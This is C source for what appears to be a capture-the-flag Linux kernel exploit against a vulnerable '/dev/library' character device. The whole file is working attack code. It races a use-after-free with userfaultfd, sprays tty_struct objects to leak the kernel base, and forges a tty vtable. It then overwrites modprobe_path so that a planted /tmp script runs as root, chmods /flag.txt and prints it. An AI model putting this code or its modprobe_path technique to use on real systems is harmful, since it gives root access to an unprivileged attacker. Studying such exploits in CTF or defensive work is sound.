#include "./exploit.h"
#include <fcntl.h>
#include <sched.h>

/*********** commands ******************/
#define DEV_PATH "/dev/library"   // the path the device is placed
#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

#define BOOK_DESCRIPTION_SIZE 0x300

/**********  types *********************/
typedef struct {
	unsigned long index;
	char* userland_pointer;
} Request;

#define GET_DESC_REGION          0x40000
#define ADD_DESC_REGION    0x50000

/*********** globals ****************/

char bigbuf[PAGE] = {0};
int fd, ttyfd;
ulong kbase = 0, tty_addr = 0;
scu mov_addr_rdx_rsi = 0x13e9b0;

// (END globals)

/********** utils ******************/

void add_book(int fd, ulong index) {
  Request req = {.index = index,};
  assert(ioctl(fd, CMD_ADD, &req) == 0);
}

void remove_all(int fd) {
  assert(ioctl(fd, CMD_REMOVE_ALL, remove_all) == 0);
}

// (END utils)

static void handler(ulong addr) {
  puts("[+] removing all books.");
  remove_all(fd);
  puts("[+] allocating tty_struct...");
  assert((ttyfd = open("/dev//ptmx", O_RDWR | O_NOCTTY)) > 3);
}

int main(int argc, char *argv[]) {
  system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/nirugiri");
  system("echo -ne \"#!/bin/sh\nchmod 777 /flag.txt && cat /flag.txt\" > /tmp/a");
  system("chmod +x /tmp/nirugiri");
  system("chmod +x /tmp/a");
  assert((fd = open(DEV_PATH, O_RDWR)) > 2);

  // spray
  for (int ix = 0; ix != 0x10; ++ix)
    assert(open("/dev/ptmx", O_RDWR | O_NOCTTY) > 3);

  // prepare
  add_book(fd, 0); add_book(fd, 1);

  // set uffd region
  struct skb_uffder *uffder = new_skb_uffder(GET_DESC_REGION, 1, bigbuf, handler, "getdesc");
  skb_uffd_start(uffder, NULL);
  sleep(1);

  // invoke uffd fault and remove all books while halting
  Request req = {.index = 1, .userland_pointer = (char*)GET_DESC_REGION};
  assert(ioctl(fd, CMD_GET_DESC, &req) == 0);

  assert((kbase = ((ulong*)GET_DESC_REGION)[0x210 / 8] - 0x14fc00) != 0);
  assert((tty_addr = ((ulong*)GET_DESC_REGION)[0x1c8 / 8] + 0x800) != 0);
  ulong modprobe_path = kbase + 0x837d00;
  ulong rop_start = kbase + mov_addr_rdx_rsi;
  printf("[!] kbase: 0x%lx\n", kbase);
  printf("[!] tty_struct : 0x%lx\n", tty_addr); // tty_addr is the Book[0]

  /****************************************************/

  // prepare
  add_book(fd, 0);

  // set uffd region
  struct skb_uffder *uffder2 = new_skb_uffder(ADD_DESC_REGION, 1, bigbuf, handler, "adddesc");
  skb_uffd_start(uffder2, NULL);
  *(unsigned*)bigbuf = 0x5401; // magic for paranoia check in tty_ioctl()

  // prepare fake vtable at the bottom of tty_struct
  for (int ix = 1; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
    ((unsigned long*)bigbuf)[ix] = tty_addr + 0x200;
  }
  for (int ix = BOOK_DESCRIPTION_SIZE / 8 / 3 * 2; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
    ((unsigned long*)bigbuf)[ix] = rop_start;
  }

  // invoke fault
  Request req2 = {.index = 0, .userland_pointer = (char*)ADD_DESC_REGION};
  assert(ioctl(fd, CMD_ADD_DESC, &req2) == 0);

  puts("[+] calling tty ioctl...");
  char *uo = "/tmp/a\x00";
  ioctl(ttyfd, ((unsigned *)uo)[0], modprobe_path);
  ioctl(ttyfd, ((unsigned *)uo)[1], modprobe_path + 4);

  puts("[+] executing evil script...");
  system("/tmp/nirugiri");
  system("cat /flag.txt");

  // end of life
  puts("[ ] END of life...");
  exit(0);
}
